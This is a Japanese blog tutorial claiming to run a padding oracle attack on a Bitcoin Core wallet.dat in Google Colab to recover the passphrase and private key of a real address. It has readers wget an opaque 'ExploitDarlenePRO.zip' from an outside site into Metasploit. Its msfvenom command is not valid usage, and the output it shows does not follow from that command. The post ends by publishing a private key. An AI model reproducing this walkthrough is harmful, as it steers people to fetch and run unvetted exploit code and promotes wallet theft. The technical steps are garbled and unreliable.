<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><code>'crypto'</code>バイトと基本的な暗号化操作を簡素化するライブラリをインストールしましょう</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!gem install crypto</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4172} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-86-1024x390.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4172"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><code>'config-hash'</code>ビッグデータの操作を簡素化するためにライブラリをインストールしましょう。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!gem install config-hash -v 0.9.0</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4173} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-87.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4173"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Metasploit FrameworkをインストールしてMSFVenomを使ってみましょう</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":4055} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-69-1024x506.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4055"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><a href="https://github.com/rapid7/metasploit-framework.git" target="_blank" rel="noreferrer noopener">GitHub</a>から<a href="https://www.metasploit.com/" target="_blank" rel="noreferrer noopener">Metasploit Framework</a>をインストールし、<a href="https://github.com/rapid7/metasploit-framework/blob/master/msfvenom" target="_blank" rel="noreferrer noopener">MSFVenom</a>ツールを使用してペイロードを作成しましょう。<a href="https://github.com/rapid7/metasploit-framework.git" target="_blank" rel="noreferrer noopener"></a><a href="https://github.com/rapid7/metasploit-framework/blob/master/msfvenom" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":3759} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-22-1024x476.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-3759"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!git clone https://github.com/rapid7/metasploit-framework.git
</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cd metasploit-framework/</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4175} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-88-1024x627.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4175"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>フォルダの中身を見てみましょう<code>"<strong><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noreferrer noopener">metasploit-framework</a></strong>"</code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":3761} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/10/image-24.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-3761"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">オプション:</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!./msfvenom -help </code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4176} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-89-1024x441.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4176"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Google Colab に<a href="https://github.com/bitcoin/bitcoin.git" target="_blank" rel="noreferrer noopener">Bitcoin Core 統合/ステージング ツリー</a>をインストールしましょう。</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!git clone https://github.com/bitcoin/bitcoin.git

</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4180} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-90-1024x511.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4180"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">ディレクトリを介してファイル<a href="https://github.com/bitcoin/bitcoin/blob/master/src/crypto/aes.cpp" target="_blank" rel="noreferrer noopener">aes.cppに移動し、&nbsp;</a><a href="https://cryptodeeptech.ru/padding-oracle-attack-on-wallet-dat/" target="_blank" rel="noreferrer noopener">Wallet.dat に対するパディング Oracle 攻撃</a>を開始するエクスプロイトを統合します。<a href="https://cryptodeeptech.ru/padding-oracle-attack-on-wallet-dat/" target="_blank" rel="noreferrer noopener"></a></h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cd bitcoin/src/crypto/</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4181} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-91-1024x354.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4181"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">cat ユーティリティを使用してファイル<a href="https://github.com/bitcoin/bitcoin/blob/master/src/crypto/aes.cpp" target="_blank" rel="noreferrer noopener">aes.cppを開きます。</a></h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat aes.cpp</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4182} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-92-1024x445.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4182"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">攻撃を実行するには、ファイル<a href="https://github.com/demining/CryptoDeepTools/raw/29bf95739c7b7464beaeb51803d4d2e1605ce954/27PaddingOracleAttackonWalletdat/wallet.dat" target="_blank" rel="noreferrer noopener">wallet.datを</a>ディレクトリ<a href="https://github.com/bitcoin/bitcoin/blob/master/src/crypto/" target="_blank" rel="noreferrer noopener">bitcoin/src/crypto/にアップロードします。</a></h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>ユーティリティを使用して、&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat" target="_blank" rel="noreferrer noopener">27PaddingOracleアタックonWalletdat</a></strong>リポジトリから<a href="https://github.com/demining/CryptoDeepTools/raw/29bf95739c7b7464beaeb51803d4d2e1605ce954/27PaddingOracleAttackonWalletdat/wallet.dat" target="_blank" rel="noreferrer noopener"><strong>wallet.dat</strong></a><strong><code>wget</code></strong>をダウンロードしてみましょう。<a href="https://github.com/demining/CryptoDeepTools/raw/29bf95739c7b7464beaeb51803d4d2e1605ce954/27PaddingOracleAttackonWalletdat/wallet.dat" target="_blank" rel="noreferrer noopener"><strong></strong></a><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/27PaddingOracleAttackonWalletdat" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!wget https://github.com/demining/CryptoDeepTools/raw/29bf95739c7b7464beaeb51803d4d2e1605ce954/27PaddingOracleAttackonWalletdat/wallet.dat</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4185} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-93-1024x317.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4185"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>ディレクトリの内容を確認してみましょう:&nbsp;<a href="https://github.com/bitcoin/bitcoin/blob/master/src/crypto/" target="_blank" rel="noreferrer noopener"><strong>bitcoin/src/crypto/</strong></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4187} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-94-1024x288.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4187"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>に戻りましょう<code><strong>Metasploit Framework</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cd /

cd content/metasploit-framework/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4192} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-95-1024x565.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4192"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>ディレクトリに従ってフォルダーを開いてみましょう。<code>/modules/exploits/</code></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4063} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-70.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4063"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><strong><a href="https://darlene.pro/" target="_blank" rel="noreferrer noopener">DarlenePRO を悪用する</a></strong></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>"ExploitDarlenePRO"</code>カタログからダウンロード:<code>/modules/exploits/</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cd modules/

ls

cd exploits/

!wget https://darlene.pro/repository/fe9b4545d58e43c1704b0135383e5f124f36e40cb54d29112d8ae7babadae791/ExploitDarlenePRO.zip</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4197} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-97-1024x455.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4197"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code>ExploitDarlenePRO.zip</code>ユーティリティを使用してコンテンツを解凍します<code>unzip</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!unzip ExploitDarlenePRO.zip</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4199} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-98-1024x462.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4199"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>カタログを見てみましょう:<code>/ExploitDarlenePRO/</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls

cd ExploitDarlenePRO/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-4.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>エクスプロイトを実行するには、に戻りましょう<code><strong>Metasploit Framework</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cd /

cd content/metasploit-framework/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4205} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-101-1024x477.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4205"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><code>LHOST&nbsp;(Local Host)</code></strong>攻撃している&nbsp;<strong><code>IP-address</code></strong>仮想マシンを特定する必要があります。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>コマンドを実行してみましょう:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!ip addr
!hostname -I</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":3795} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-6.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-3795"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>ツールを使用してペイロードを作成しましょう&nbsp;<strong><code>MSFVenom</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>操作には、ビットコインウォレットを選択します:&nbsp;<strong><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></strong>&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-80.png" alt="Libbitcoin Explorer 3.x ライブラリの Milk Sad 脆弱性、ビットコイン ウォレット (BTC) ユーザーからの 90 万ドルの盗難がどのように実行されたのか"/><figcaption class="wp-element-caption"><a href="https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/address/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>起動コマンド:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>!./msfvenom 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b -p modules/exploits/ExploitDarlenePRO LHOST=172.28.0.12 -f RB -o decode_core.rb -p bitcoin/src/crypto LHOST=172.28.0.12 -f CPP -o aes.cpp -p bitcoin/src/crypto LHOST=172.28.0.12 -f DAT -o wallet.dat
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4211} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-104-1024x237.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4211"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><strong>結果：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>1111111001010001100010110100011010011111011101001010111001011110010111000011101101000101010100001111000000011110010001110001110001011000111101001101110010010010101001101011110100010010100011011011001010111100110100110011100100001110110101001110111011100101</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>結果のバイナリ形式をファイルに保存する必要があります。Python<strong><em><a href="https://github.com/demining/CryptoDeepTools/blob/main/27PaddingOracleAttackonWalletdat/binary_save.py">スクリプトを</a></em></strong><strong><code><a href="https://github.com/demining/CryptoDeepTools/blob/main/27PaddingOracleAttackonWalletdat/walletpassphrase.txt" target="_blank" rel="noreferrer noopener">walletpassphrase.txt</a></code></strong>使用します。<strong><em><a href="https://github.com/demining/CryptoDeepTools/blob/main/27PaddingOracleAttackonWalletdat/binary_save.py"></a></em></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>チーム：</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>import hashlib

Binary = "1111111001010001100010110100011010011111011101001010111001011110010111000011101101000101010100001111000000011110010001110001110001011000111101001101110010010010101001101011110100010010100011011011001010111100110100110011100100001110110101001110111011100101"

f = open("walletpassphrase.txt", 'w')
f.write("walletpassphrase " + Binary + " 60" + "\n")
f.write("" + "\n")
f.close()

</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4214} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-105-1024x439.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4214"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">ファイルを開きます:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/27PaddingOracleAttackonWalletdat/walletpassphrase.txt" target="_blank" rel="noreferrer noopener">walletpassphrase.txt</a></h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ls</code></pre>
<!-- /wp:code -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat walletpassphrase.txt</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4216} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-106-1024x607.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4216"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">結果：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>walletpassphrase 1111111001010001100010110100011010011111011101001010111001011110010111000011101101000101010100001111000000011110010001110001110001011000111101001101110010010010101001101011110100010010100011011011001010111100110100110011100100001110110101001110111011100101 60
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2 class="wp-block-heading">秘密鍵にアクセスするためのパスワードが見つかりました。</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><code>dumpprivkey "address"</code></strong>コンソールからコマンドを使ってみましょう<strong><code>Bitcoin Core</code></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><strong>チーム:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>walletpassphrase 1111111001010001100010110100011010011111011101001010111001011110010111000011101101000101010100001111000000011110010001110001110001011000111101001101110010010010101001101011110100010010100011011011001010111100110100110011100100001110110101001110111011100101 60
</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>dumpprivkey 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/doc/walletdatgif04.gif" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>結果：</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>KyAqkBWTbeR3w4RdzgT58R5Rp7RSL6PfdFDEkJbwjCcSaRgqg3Vz
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2 class="wp-block-heading">秘密鍵を受け取りました!</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>ライブラリをインストールしましょう<code><strong>Bitcoin Utils</strong></code></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code>pip3 install bitcoin-utils</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4221} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-107-1024x431.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4221"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/27PaddingOracleAttackonWalletdat/bitcoin_utils.py" target="_blank" rel="noreferrer noopener"><strong>コード</strong></a>を実行して、ビットコイン アドレスの準拠性を確認してみましょう。</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":4223} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-109-1024x801.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4223"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Private key WIF: KyAqkBWTbeR3w4RdzgT58R5Rp7RSL6PfdFDEkJbwjCcSaRgqg3Vz
Public key: 02ad103ef184f77ab673566956d98f78b491f3d67edc6b77b2d0dfe3e41db5872f
Address: 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b
Hash160: 7774801e52a110aba2d65ecc58daf0cfec95a09f

--------------------------------------

The message to sign: CryptoDeepTech
The signature is: ILPeG1ThZ0XUXz3iPvd0Q6ObUTF7SxmnhUK2q0ImEeepcZ00npIRqMWOLEfWSJTKd1g56CsRFa/xI/fRUQVi19Q=
The signature is valid!</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>それは正しい！秘密鍵はビットコインウォレットに相当します。</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">ビットアドレス</a></strong>を開いて確認してみましょう&nbsp;&nbsp;:</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>ADDR: 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b
WIF:  KyAqkBWTbeR3w4RdzgT58R5Rp7RSL6PfdFDEkJbwjCcSaRgqg3Vz
HEX:  3A32D38E814198CC8DD20B49752615A835D67041C4EC94489A61365D9B6AD330</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":4225} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-110.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4225"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:embed {"url":"https://www.blockchain.com/en/explorer/addresses/btc/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://www.blockchain.com/en/explorer/addresses/btc/1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b
</div></figure>
<!-- /wp:embed -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":4226} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-111.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4226"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":4227} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/11/image-112.png" alt="人気のビットコインコアウォレットのWallet.datパスワード復号化に対するOracle攻撃のパディング" class="wp-image-4227"/></figure>
